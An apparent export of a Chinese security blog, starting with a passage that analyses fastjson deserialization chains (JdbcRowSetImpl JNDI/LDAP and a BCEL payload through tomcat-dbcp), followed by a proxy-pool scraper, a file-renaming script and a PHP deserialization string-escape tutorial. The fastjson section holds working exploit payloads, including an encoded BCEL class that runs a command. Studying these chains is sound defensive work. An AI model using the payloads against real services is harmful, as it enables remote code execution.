!getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">            <span class="comment">// user, passwd can be null</span></span><br><span class="line">            <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">                    (getUrl(), getUsername(), getPassword());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当getDataSourceName() != null成立的时候就会调用lookup，就可以导致远程加载类攻击，看看getDataSourceName()方法<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221009923.png"></p>
<p>返回了dataSource的值，跟进一波<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221009639.png"></p>
<p>找到了setDataSourceName这个方法<br>在BaseRowSet.Java里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            dataSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           dataSource = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        URL = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在JdbcRowSetImpl.Java里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String dsName)</span> <span class="keyword">throws</span> SQLException&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(!getDataSourceName().equals(dsName)) &#123;</span><br><span class="line">             <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">             conn = <span class="literal">null</span>;</span><br><span class="line">             ps = <span class="literal">null</span>;</span><br><span class="line">             rs = <span class="literal">null</span>;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>就是说这个就是远程加载的地址了，我们在反序列化会自动调用setter方法，调用setDataSourceName()和setAutoCommit() ，而JdbcRowSetImpl是 BaseRowSet子类，他们都有setter，先到JdbcRowSetImpl的setter转到BaseRowSet的setter，调用时fastjson会自动加上前缀set，导致远程加载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/SHzRiHto\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在11.0.1, 8u191, 7u201, 6u211版本之后ldap已经被限制了</p>
<h3 id="不出网链子bcel"><a href="#不出网链子bcel" class="headerlink" title="不出网链子bcel"></a>不出网链子bcel</h3><p>有一个条件是需要引入org.apache.tomcat的包，但是这个很常见。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.20</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>生成恶意类字节码数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;E:\\Evil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        <span class="comment">//classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String filePath) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="comment">// 将文件内容读取到字节数组中</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteOutput.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteOutput.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>恶意类我们可以随便写一个弹计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testcon</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;$l$8b$I$A$A$A$A$A$A$AeQ$c9N$CA$Q$7d$N$p$N$e3$b8$An$b8$e0n$A$8d$5c$bca$bc$YL$8c$b8D$8c$c6$e8eh$3b$a4q$981$c3$a0$fe$91g$_hL$f4$D$fc$uc$f5H$c4$a5$93$ee$aaz$fd$eaUu$f5$fb$c7$cb$h$80$N$ac$98H$mmb$E$a3$icq$8ckw$c2D$G$93$iS$i$d3$i3$M$b1M$e5$aa$60$8b$n$9a$cb$9f2$Y$db$de$95d$Y$aa$uW$k$b4$9b5$e9$9f$d85$87$90$f8$a6p$ba$cc$81j$60$8b$eb$7d$fb$s$bc$o$z$G$b3$ea$b5$7d$nw$94$a6$s$ca$b7$caYo$d8$b7$b6$F$T$fd$iY$L$b3$98c$Y$d6X$d1$b1$ddz$b1$g$f8$ca$adS$3da$3b$c2$c2$3c$W8$W$z$ya$99$n$dd$a3$95$ef$85$bc$J$94$e7$SS$ab$fe$d28$ac5$a4$I$Y$92$3d$e8$b8$ed$G$aaI$3d$98u$Z$7c$H$a3$b9$7c$e5$l$a7D$92$f2$5e$K$86$5c$ee$a2$f2$b7$b3$d2$cf$8c$p$df$T$b2$d5$w$fd$w$d5$F$Z$f8$9d$ad$82$j$cf$PG$b8KO$89$d3$dc$f5$8a$80$e9$f7$d3iQ4C$96$91$ed$x$3c$81$3d$92C$83$a43$W$82$G$r$N$7eS$F$c5Q$b2$d9gD$f6$8cWD$cf$a3$v$a3Z$v$acv$d0$b7$bf$d6A$ec$ec$B$c6$dec$98$99$c148$95$d2ZY$f2$40$fbK$zA$df$ad$7f$7b$80$Y$fdT$7e$QC$e1m$e4$92cX$97O$86$3d$a6$3e$B$5e$d1J$d71$C$A$A&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="string">&quot;\&quot;,\&quot;driverClassloader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析下链子<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221010323.png"></p>
<p>这里forName第二个参数为true初始化了driverClassName这个类，我们看看能不能污染driverClassLoader和driverClassName的值<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221010105.png"></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221010269.png"></p>
<p>发现存在两个setter方法，就说明这两个变量可控，在createConnectionFactory往上面找找，找到<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221011707.png"></p>
<p>createDataSource再往上找发现getConnection<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221011812.png"></p>
<p>既然找到了getter就可以用parseObject调用了，那我们就需要找到一个恶意类调用，于是找到了com.sun.org.apache.bcel.internal.util.ClassLoader<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221011875.png"></p>
<p>检查这个头是不是带有$$BCEL$$如果是就creatClass，creatClass里面Utility.decode了class_name<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221012713.png"></p>
<p>控制driverClassName的值的时候实际上执行了一些loaderClass的操作<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221012385.png"></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221012678.png"></p>
<p>最后到了class_name里面<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221013629.png"></p>
<p>大概链子这样子<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202309221013128.png"></p>
<p>至于为什么bcel会存在原生jdk里面可以看看大佬的文章<br><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p>
]]></content>
      <tags>
        <tag>java_nday</tag>
      </tags>
  </entry>
  <entry>
    <title>一个简易的ip代理池</title>
    <url>/2020/05/08/ip_daili/</url>
    <content><![CDATA[<p>用py写了一个简单的ip代理池，源码如下:</p>
<span id="more"></span>
<h5 id="从xici爬取ip"><a href="#从xici爬取ip" class="headerlink" title="从xici爬取ip"></a>从xici爬取ip</h5><p>tip: 需要在目录下创建HTTPS_ip.txt和HTTP_ip.txt和一个enable_ip.txt<br>    # -<em>- coding: utf-8 -</em>-</p>
<pre><code>from bs4 import BeautifulSoup
import requests
import os

def get_ip_list(url):
    headers = &#123;&#39;Accept&#39;: &#39;text/html, application/xhtml+xml, image/jxr, */*&#39;,
            &#39;Accept - Encoding&#39;:&#39;gzip, deflate&#39;,
            &#39;Accept-Language&#39;:&#39;zh-Hans-CN, zh-Hans; q=0.5&#39;,
            &#39;Connection&#39;:&#39;Keep-Alive&#39;,
            &#39;Host&#39;:&#39;zhannei.baidu.com&#39;,
            &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063&#39;&#125;
    web_data = requests.get(url=url,headers=headers)
    if &#39;200&#39; not in web_data:
        print(&quot;访问失败，可能是禁了ip，当前访问页面状态码:%s&quot; % (web_data))
    soup = BeautifulSoup(web_data.text,&#39;html.parser&#39;)
    ips = soup.find_all(&#39;tr&#39;)
    fhttp = open(&quot;HTTP_IP.txt&quot;,&#39;a&#39;)
    fhttps = open(&quot;HTTPS_IP.txt&quot;,&#39;a&#39;)
    fsocks = open(&quot;socks_IP.txt&quot;,&#39;a&#39;)
    for i in range(1,len(ips)):
        ip_info = ips[i]
        tds = ip_info.find_all(&#39;td&#39;)
        print(&quot;IP:&#123;&#125;    port:&#123;&#125;    noun:&#123;&#125;&quot;.format(tds[1].text,tds[2].text,tds[5].text))
        item = str(tds[1].text) + &#39;,&#39; + str(tds[2].text) + &#39;,&#39; +str(tds[5].text) + &#39;\n&#39;
        if &#39;HTTP&#39; in item and len(tds[5].text) == 4:
            fhttp.write(item)
        if &#39;HTTPS&#39; in item:
            fhttps.write(item)
        if &#39;socks4/5&#39; in item:
            fsocks.write(item)
    fhttp.close()
    fhttps.close()
    fsocks.close()




if __name__==&quot;__main__&quot;:
    if (os.path.exists(&quot;HTTP_IP.txt&quot;)):  #判断文件是否存在，存在返回True，否则返回False
        os.remove(&quot;HTTP_IP.txt&quot;)  #删除存在的文件，为了追加的写入方式写入的数据不重复
    if (os.path.exists(&quot;HTTPS_IP.txt&quot;)):  
        os.remove(&quot;HTTPS_IP.txt&quot;)
    if (os.path.exists(&quot;socks_IP.txt&quot;)):  
        os.remove(&quot;socks_IP.txt&quot;)      #突然想到直接在这里就以w方式打开文件，就不需要考虑以追加的写入方式写入的数据重复的问题
    for i in range(1,11):        #设爬取代理的范围
        target_url = &quot;https://www.xicidaili.com/nn/&quot; + str(i) # 爬取代理的网站
        get_ip_list(target_url)
</code></pre>
<hr>
<h5 id="验证ip可用性"><a href="#验证ip可用性" class="headerlink" title="验证ip可用性"></a>验证ip可用性</h5><pre><code># -*- coding: utf-8 -*-

import requests
from queue import Queue
import sys
import threading
import telnetlib


class Check_IP(threading.Thread):


    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue

    def run(self):
        global lines 
        lines = [] 

        while (not self._queue.empty()):    #只要队列不为空就继续从队列中取url路径
            url = self._queue.get()
            # print(url)

            ip,port,types = url.split(&#39;,&#39;,3)

            try :
                telnetlib.Telnet(ip,port,timeout=6)        #超过6秒则判定为无效IP代理

                # if r.status_code == 200 :
                #     sys.stdout.write(&#39;[*] %s\n&#39; % url)    #显示状态码为200的url
                print(&quot;%s可用&quot; % (url))
                lines.append(url+&#39;\n&#39;)
            except Exception:
                print(&quot;%s不可用&quot; % (url))

    def write_enable_ip():
        fw = open(&quot;enable_ip\\enable_ip.txt&quot;,&#39;w&#39;)
        for i in range(len(lines)):
            fw.write(lines[i])
        fw.close()            
    
        
def start(txt,count):
    queue = Queue()

    fr = open(&#39;%s&#39; % txt,&#39;r&#39;,encoding=&#39;utf-8&#39;)    #按行读取文件内容
    lines = fr.readlines()  
    fr.close()
    for line in lines:
        ip,port,types= line.split(&#39;,&#39;,3)    #将ip、端口和类型读取并分别赋值
        types = types.rstrip(&#39;\n&#39;)
        queue.put(ip+&#39;,&#39;+port+&#39;,&#39;+types) 

    threads = []
    thread_count = int(count)

    for i in range(thread_count):
        threads.append(Check_IP(queue))

    for t in threads:
        t.start()

    for t in threads:
        t.join()    

if __name__==&quot;__main__&quot;:
    txt = &#39;HTTPS_IP.txt&#39;        #设置要验证的代理类型的文件
    count = 8    #设定线程数
    start(txt,count)
    Check_IP.write_enable_ip()
</code></pre>
<p><a href="https://glunko.lanzous.com/ice8ugf">我是项目地址</a><br>password:<del>31ex</del></p>
]]></content>
      <tags>
        <tag>ip代理池</tag>
      </tags>
  </entry>
  <entry>
    <title>文件改名那些事</title>
    <url>/2020/05/08/wenjiangaiming/</url>
    <content><![CDATA[<p>最近从xx音乐下载了一堆周杰伦的歌，发现后面有随机生成的数字，一个个重命名太慢了，只好写个py  </p>
<span id="more"></span>
<p>源码：<br>    import os<br>    import os.path<br>    import sys<br>    from string import digits<br>    etx=’.flac’<br>    read_file_dir = input(r’请输入要修改文件扩展名的路径：’)<br>    files = os.listdir(read_file_dir) # 列出当前目录下所有的文件<br>    for filename in files:<br>        portion = os.path.splitext(filename) # 分离文件名字和后缀<br>        remove_digits = str.maketrans(‘’, ‘’, digits)<br>        res = portion[0].translate(remove_digits) #去掉数字的前缀<br>        newname = res + etx #重新组合<br>        if  not any(char.isdigit() for char in newname): #去掉数字后做一个保存<br>            os.chdir(read_file_dir)<br>            os.rename(filename,newname)<br>        print(os.path.basename(filename)+’ -&gt; ‘+ os.path.basename(newname))</p>
<hr>
<p>在冲浪的时候看见的菜鸟教程的笔记，于是白嫖了:<br>    # 搜寻单层目录下的blv文件并将其转换为flv文件<br>    # 用于哔哩哔哩缓存视频blv格式转换后合并（本例程只是做个小小的扩展名转换）</p>
<pre><code>import os
import os.path

ext_from = &#39;.blv&#39;
ext_to = &#39;.flv&#39;

read_file_dir = input(r&#39;请输入要修改文件扩展名的路径：&#39;)

files = os.listdir(read_file_dir) # 列出当前目录下所有的文件

for filename in files:
    portion = os.path.splitext(filename) # 分离文件名字和后缀

    if portion[1] ==ext_from:  #检测扩展名
        newname = portion[0]+ext_to  #改新的新扩展名
        os.chdir(read_file_dir)  
        os.rename(filename,newname)
        print(os.path.basename(filename)+&#39; -&gt; &#39;+ os.path.basename(newname))
</code></pre>
]]></content>
      <tags>
        <tag>文件重命名</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化字符串逃逸</title>
    <url>/2023/09/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h1><p>字符串逃逸最后的目的无非就是把我们要进行序列化的对象进行成员污染，比如以下代码：</p>
<span id="more"></span>

<h2 id="1-字符串被替换增多了导致字符串逃逸"><a href="#1-字符串被替换增多了导致字符串逃逸" class="headerlink" title="1.字符串被替换增多了导致字符串逃逸"></a>1.字符串被替换增多了导致字符串逃逸</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>假设v2的值为666才可以通过鉴权，我们应该怎么做，而v2的值又是不可控的，只有v1我们可控，我们可以把这个字符串逃逸当成sql注入去理解，插入了目标字符让序列化后的成员被我们污染，要理解字符串逃逸要先理解序列化原理：<br><strong>1、反序列化以<font color=red>;}</font>结束，后面的字符串不影响正常的反序列化</strong><br><strong>2、序列化后的结果s：“xx”表示后面多少个“字符”是字符，如果字符格式不对就会报错</strong><br>首先我们看看第一个，把user这个类序列看看怎么理解：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>
<p>$data输出为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>其中O代表OBJ，对象的意思，$data是我们实例化的对象，O：1表示这个对象名称字符串有1个字符，后面的s:2:”v2”;表示这个成员的属性，后面的s:2:”ls”;表示这个成员的值，以此类推，每个地方都用分号分隔，最后以大括号闭合，这个s:后面代表这个字符串的长度，当然还有f:代表浮点数这些等等，这个字符串长度告诉php这个东西有多少个字符，全部当成字符串处理进行反序列化包括<strong style="color:red;">;}</strong>，也就是说假设存在一个ls”;s:2:”v2”;s:3:”666”<strong style="color:red;">;}</strong>这个成员值也是可以序列化的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;666&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>O:1:”A”:2:{s:2:”v1”;s:24:”<span style="background-color: Cornsilk; color: Turquoise;">ls”;s:2:”v2”;s:3:”666”;}</span>“;s:2:”v2”;s:3:”123”<strong style="color:red;">;}</strong><br>此时的ls”;s:2:”v2”;s:3:”123”;}还是被当成字符串处理了，因为s:24，如果这个s的值变了是不是可以导致提前闭合<strong style="color:red;">;}</strong>,假设这个s变成了s:2那么ls就是v1的值而后面的溢出字符就是污染了v2的值<br>O:1:”A”:2:{s:2:”v1”;s:2:”<span style="background-color: Plum; color: Turquoise;">ls</span><span style="background-color: Plum;">“;s:2:”v2”;s:3:”666”</span><strong style="background-color: Plum; color:red;">;}</strong>“;s:2:”v2”;s:3:”123”;}666后面的<strong style="color:red;">;}</strong>代表了序列化结束后面的字符全是类似注释一样的东西，<span style="background-color: Plum;">“;s:2:”v2”;s:3:”666”</span><strong style="background-color: Plum; color:red;">;}</strong>这就是我们逃逸出来的字符串我们把它反序列化看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$__PHP_Incomplete_Class_Name</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v1</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;ls&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v2</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;666&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到v2已经变成了666的值，再看原来代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure>
<p>我们看两段序列化的字段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;pwd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
